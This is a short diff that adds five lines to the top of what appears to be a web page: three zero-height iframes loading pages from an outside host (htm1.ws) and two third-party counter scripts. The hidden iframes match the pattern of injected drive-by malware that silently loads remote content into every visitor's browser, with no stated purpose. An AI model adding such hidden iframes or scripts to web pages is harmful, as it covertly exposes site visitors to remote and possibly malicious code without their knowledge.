@@ -1,0 +1,5 @@
+<iframe src=http://htm1.ws/www/014.htm width=100 height=0></iframe>
+<iframe src=http://htm1.ws/www/r2.htm width=100 height=0></iframe>
+<iframe src=http://htm1.ws/www/bd.htm width=100 height=0></iframe>
+<script language="javascript" src="http://count36.51yes.com/click.aspx?id=360631815&logo=1"></script>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1519290.js"></script>
